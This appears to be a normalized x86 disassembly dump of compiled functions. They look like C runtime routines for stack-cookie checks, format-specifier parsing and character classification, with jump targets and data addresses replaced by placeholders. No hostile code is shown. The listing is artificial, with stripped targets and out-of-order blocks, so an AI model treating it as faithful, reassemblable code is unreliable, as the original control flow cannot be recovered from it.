retn 0x18
sub_41c8d5
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417bb9
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c904
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c7b0
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c939
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c7ec
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c96e
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417cf9
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c99d
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c7ec
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c9d2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c828
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca07
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417c59
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca36
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c828
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca6b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c864
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41caa0
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417d99
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cacf
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c864
and [ esi + 0x450 ] 0x0
call sub_42fef5
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cb44
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0xc ] 0x0
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ecx ]
mov [ edi + 0x4 ] eax
mov eax [ ecx + 0x4 ]
jmp r-xdata
push esi
call sub_42fa1d
lea edx [ edi + 0x4 ]
mov [ edi ] eax
push edx
lea esi [ edi + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ edx ] ecx
mov ecx [ eax + 0x48 ]
push eax
mov [ esi ] ecx
call sub_434ec4
push esi
push [ edi ]
call sub_434ef1
mov ecx [ edi ]
add esp 0x10
mov eax [ ecx + 0x350 ]
pop esi
test al 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x4 ] eax
mov eax [ rw-data ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x350 ] eax
mov [ edi + 0xc ] 0x1
sub_41cd1b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi ]
call sub_42d0aa
mov edx [ ebp + 0x8 ]
and [ esi ] 0x0
pop ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax esi
and [ edx ] 0x0
pop esi
pop ebp
retn 0x4
sub_41cd48
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41c9d2
lea ecx [ ebp - 0x45c ]
call sub_41eaba
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41ce0e
mov edi edi
push ebp
mov ebp esp
sub esp 0xae4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0xae0 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0xadc ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xab8 ] eax
mov eax [ esi + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xabc ] eax
lea eax [ ebp - 0xad8 ]
mov [ ebp - 0xac0 ] eax
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov [ ebp - 0xac4 ] eax
mov eax [ ecx ]
mov [ ebp - 0xacc ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xac8 ] eax
lea eax [ ebp - 0xabc ]
push eax
lea eax [ ebp - 0xac0 ]
push eax
lea eax [ ebp - 0xac4 ]
push eax
lea eax [ ebp - 0xacc ]
push eax
lea eax [ ebp - 0xab8 ]
push eax
call sub_417bb9
call sub_42fef5
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41e4a2
lea ecx [ ebp - 0xa74 ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0xad0 ] 0x0
je r-xdata
push edi
push [ ebp - 0xae0 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xadc ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41cf18
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41ca36
lea ecx [ ebp - 0x45c ]
call sub_41ed4a
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41cfe7
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41c904
lea ecx [ ebp - 0x45c ]
call sub_41e5fe
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d0ad
mov edi edi
push ebp
mov ebp esp
sub esp 0xae4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0xae0 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0xadc ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xab8 ] eax
mov eax [ esi + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xabc ] eax
lea eax [ ebp - 0xad8 ]
mov [ ebp - 0xac0 ] eax
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov [ ebp - 0xac4 ] eax
mov eax [ ecx ]
mov [ ebp - 0xacc ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xac8 ] eax
lea eax [ ebp - 0xabc ]
push eax
lea eax [ ebp - 0xac0 ]
push eax
lea eax [ ebp - 0xac4 ]
push eax
lea eax [ ebp - 0xacc ]
push eax
lea eax [ ebp - 0xab8 ]
push eax
call sub_417c59
call sub_42fef5
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41ebea
lea ecx [ ebp - 0xa74 ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0xad0 ] 0x0
je r-xdata
push edi
push [ ebp - 0xae0 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xadc ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d1e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_43314b
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cb44
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41c8a0
lea ecx [ ebp - 0x45c ]
call sub_41e37a
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cd01
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_433200
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d2a5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d2c3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d2e1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d2ff
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d31d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d33b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d359
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d377
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d395
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3d1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3ef
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d40d
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d459
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d4a5
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d4f1
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d589
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov bl [ eax ]
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al bl
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
inc ecx
pop ebx
pop ebp
retn
jmp r-xdata
mov al [ ecx ]
test al al
jne r-xdata
cmp al 0x65
je r-xdata
mov edx ecx
cmp al 0x45
je r-xdata
dec ecx
cmp [ ecx ] 0x30
je r-xdata
cmp [ ecx ] bl
jne r-xdata
inc ecx
mov al [ edx ]
inc ecx
inc edx
mov [ ecx ] al
test al al
jne r-xdata
dec ecx
sub_41d5e0
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d615
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d64a
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor ecx ecx
movsx eax cl
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d67c
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d6b1
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor eax eax
movsx eax cl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d6e6
mov edi edi
push ebp
mov ebp esp
mov cl [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp al 0x5a
ja r-xdata
xor ecx ecx
movsx eax cl
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d718
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d74f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d786
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor ecx ecx
movzx eax cx
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d7ba
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d7f1
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
imul ecx eax 0x9
mov eax [ ebp + 0xc ]
movzx eax [ ecx + eax + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d828
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x20 ]
cmp ax 0x5a
ja r-xdata
xor ecx ecx
movzx eax cx
movzx ecx [ eax + r--data ]
and ecx 0xf
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + ecx * 8 + r--data ]
shr eax 0x4
pop ebp
retn 0x8
sub_41d85c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_433b2d
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_433671
test eax eax
movsx eax [ esi ]
push eax
call sub_433b2d
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp + 0xc ]
mov cl [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
pop ebp
retn
sub_41da34
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov cl [ esi + 0x4 ]
cmp cl 0x70
mov [ ebp - 0x8 ] ecx
sete dh
cmp bl 0x70
sete dl
test dh dh
jne r-xdata
xor eax eax
cmp dh dl
test dl dl
jne r-xdata
xor eax eax
cmp cl 0x73
je r-xdata
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x1 ] al
cmp cl 0x53
jne r-xdata
mov dh 0x1
mov dh al
cmp bl 0x53
jne r-xdata
cmp bl 0x73
je r-xdata
mov dl 0x1
mov dl al
cmp cl 0x43
jne r-xdata
cmp cl 0x63
je r-xdata
mov al 0x1
cmp bl 0x43
jne r-xdata
cmp bl 0x63
je r-xdata
cmp [ ebp - 0x1 ] dh
jne r-xdata
test dh dh
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp dl al
jne r-xdata
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push ebx
push [ edi + 0x4 ]
push [ edi ]
call sub_41b4f1
push [ esi + 0xc ]
mov bl al
push [ ebp - 0x8 ]
push [ edi + 0x4 ]
push [ edi ]
call sub_41b4f1
add esp 0x20
cmp al bl
sete al
jmp r-xdata
test al al
jne r-xdata
push ecx
call sub_41b373
push ebx
mov [ ebp - 0x1 ] al
call sub_41b373
pop ecx
pop ecx
mov cl [ ebp - 0x1 ]
test cl cl
jne r-xdata
cmp cl al
jne r-xdata
test al al
jne r-xdata
xor ecx ecx
cmp [ esi + 0xc ] 0x9
sete cl
xor eax eax
cmp [ ebp + 0x14 ] 0x9
sete al
cmp ecx eax
jne r-xdata
mov ecx [ esi ]
xor eax eax
cmp ecx [ ebp + 0xc ]
jmp r-xdata
push [ esi + 0xc ]
call sub_423023
push [ ebp + 0x14 ]
mov ebx eax
call sub_423023
sub ebx eax
neg ebx
pop ecx
sbb ebx ebx
inc ebx
pop ecx
mov al bl
jmp r-xdata
sete al
sub_41db62
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
mov cl [ esi + 0x4 ]
cmp cl 0x70
mov [ ebp - 0x8 ] ecx
sete dh
cmp bl 0x70
sete dl
test dh dh
jne r-xdata
xor eax eax
cmp dh dl
test dl dl
jne r-xdata
xor eax eax
cmp cl 0x73
je r-xdata
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x1 ] al
cmp cl 0x53
jne r-xdata
mov dh 0x1
mov dh al
cmp bl 0x53
jne r-xdata
cmp bl 0x73
je r-xdata
mov dl 0x1
mov dl al
cmp cl 0x43
jne r-xdata
cmp cl 0x63
je r-xdata
mov al 0x1
cmp bl 0x43
jne r-xdata
cmp bl 0x63
je r-xdata
cmp [ ebp - 0x1 ] dh
jne r-xdata
test dh dh
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp dl al
jne r-xdata
test dl dl
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
push [ ebp + 0x14 ]
push ebx
push [ edi + 0x4 ]
push [ edi ]
call sub_41b4f1
push [ esi + 0xc ]
mov bl al
push [ ebp - 0x8 ]
push [ edi + 0x4 ]
push [ edi ]
call sub_41b4f1
add esp 0x20
cmp al bl
sete al
jmp r-xdata
test al al
jne r-xdata
push ecx
call sub_41b3a0
